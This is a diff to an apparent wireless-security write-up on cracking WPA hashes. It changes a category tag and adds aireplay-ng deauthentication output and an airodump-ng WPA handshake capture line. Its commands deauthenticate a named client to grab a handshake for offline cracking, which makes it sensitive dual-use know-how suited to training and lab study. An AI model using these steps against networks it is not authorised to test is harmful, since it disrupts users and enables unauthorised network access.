@@ -3,7 +3,7 @@ description: >-
   Cracking Hashes
 title:  Cracking Hashes      # Add title here
 date: 2023-09-27 08:00:00 -0600                           # Change the date to match completion date
-categories: [18 Wireless, Attacks]                     # Change Templates to Writeup
+categories: [18 Wireless, Wireless Attacks]                     # Change Templates to Writeup
 tags: [wireless, cracking hashes]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
 show_image_post: false                                    # Change this to true
 #image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
@@ -50,6 +50,13 @@ sudo airodump-ng -c 5 -w wpa --essid 'Not_Of_Your_Buzzinez' --bssid 7C:13:1D:B2:
 With the airodump-ng running we then proceed to deauthenticate the user from the AP with aireplay-ng. We'll use the -0 1 option to deauthenticate once, and -a to target our BSSID. We'll use -c to identify the associated client, and finally specify wlan0mon for our listening interface.
 ```bash
 sudo aireplay-ng -0 1 -a 7C:13:1D:B2:3D:A4 -c 1E:F4:C6:7B:66:C1 wlan0
+13:30:30  Waiting for beacon frame (BSSID: 7C:13:1D:B2:3D:A4) on channel 1
+13:30:30  Sending 64 directed DeAuth (code 7). STMAC: [1E:F4:C6:7B:66:C1] [ 0| 0 ACKs]
+
+```
+Aireplay-ng checks that the BSSID exists before sending the deauthentication packets. Once the client reconnects with the target AP, airodump-ng will be able to capture a handshake.
+```bash
+CH  5 ][ Elapsed: 52 s ][ 2020-02-29 13:31 ][ WPA handshake: 1E:F4:C6:7B:66:C1
 ```
 
 ### Cracking the Hash
